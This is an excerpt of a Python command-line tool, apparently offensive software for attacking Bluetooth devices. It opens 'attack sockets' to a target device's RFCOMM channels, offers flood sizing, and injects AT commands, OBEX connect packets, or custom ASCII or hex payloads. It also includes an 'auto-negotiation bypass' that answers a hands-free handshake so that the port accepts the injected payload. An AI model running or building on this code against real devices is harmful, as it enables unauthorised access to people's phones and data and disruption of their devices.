...
class DissPairCLI:
    ...
    def interact_classic(self):
        ...
        while True:
            ...
            print(f"    {C}FLOOD SIZE:{W} {self.payload_size} Bytes\n")
            ...
            print(f"    {D}[4]{W} {Y}PAYLOADS{W}  (Inject Custom ASCII / Hex / OBEX)")
            print(f"    {D}[5]{W} Set Flood Size")
            ...
            elif cmd == '4': self._action_custom_payload(ch, c_type)
            elif cmd == '5':
    ...
    def _action_custom_payload(self, ch, c_type):
        print(f"\n[{C}*{W}] Select Payload")
        print(f"    {D}[1]{W} AT Command: Connect (ATZ\\r\\n)")
        print(f"    {D}[2]{W} PBAP/MAP: OBEX Connect (0x80...)")
        print(f"    {D}[3]{W} Custom ASCII Payload (Auto-appends \\r\\n)")
        print(f"    {D}[4]{W} Custom Hex Payload (Raw Binary)")
        print(f"    {D}[0]{W} Cancel\n")

        cmd = self.input_prompt("Payload ID: ")
        
        payload_bytes = b""
        payload_name = ""

        if cmd == '1':
            payload_name = "AT Command: Connect"
            payload_bytes = b"ATZ\r\n"
        elif cmd == '2':
            payload_name = "OBEX Connect"
            payload_bytes = bytes([0x80, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00])
        elif cmd == '3':
            val = self.input_prompt("Enter Custom AT Command: ")
            if not val.endswith("\r\n"): val += "\r\n"
            payload_name = "Custom ASCII"
            payload_bytes = val.encode('utf-8')
        elif cmd == '4':
            val = self.input_prompt("Enter Hex (e.g. FF 00): ").replace(" ", "")
            try:
                payload_bytes = bytes.fromhex(val)
                payload_name = "Custom Hex"
            except ValueError:
                print(f"[{R}!{W}] Invalid Hex format.")
                time.sleep(1)
                return
        else:
            return
        ...
        if not payload_bytes:
            print(f"[{R}!{W}] Payload cannot be empty.")
            time.sleep(1)
            return

        print(f"\n[{C}*{W}] Sending payload '{payload_name}' on Ch {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            # Short timeout to capture the initial greeting quickly
            sock.settimeout(0.5) 
            ...
            if greeting:
                try:
                    g_ascii = greeting.decode('utf-8', errors='ignore')
                    if "BRSF" in g_ascii:
                        is_hfp_locked = True
                        print(f"[{Y}!{W}] Target Handshake Request Captured (BRSF)")
                    else:
                        print(f"[{Y}!{W}] Target Greeting: {g_ascii.strip()}")
                except:
                    pass

            # --- NEW: AUTO-NEGOTIATION BYPASS ---
            if is_hfp_locked:
                print(f"[{C}*{W}] Auto-negotiating HFP bypass...")
                sock.send(b"AT+BRSF=0\r\n")
                time.sleep(0.3)
                try:
                    sock.recv(1024) # Clear the response buffer
                except socket.timeout:
                    pass
                print(f"[{G}+{W}] Port unlocked. Injecting payload...")

            sock.send(payload_bytes)
            
            # Reset timeout to wait for actual response
            sock.settimeout(2.0)
            ...
            try:
                ...
                if response:
                    print(f"\n[{G}+{W}] Payload RX HEX:")
                    print(f"    {D}{response.hex()}{W}")
                    try:
                        r_ascii = response.decode('utf-8', errors='ignore')
                        print(f"[{G}+{W}] Payload RX ASCII:")
                        print(f"    {D}{repr(r_ascii)}{W}")
                    except:
                        pass
                else:
                    print(f"\n[{Y}-{W}] No data returned to payload.")
            except socket.timeout:
                print(f"\n[{Y}-{W}] Read timeout (Target did not reply).")

        except Exception as e:
            print(f"[{R}-{W}] Payload Delivery Failed: {e}")
        finally:
            try: sock.close()
            except: pass
            print("")
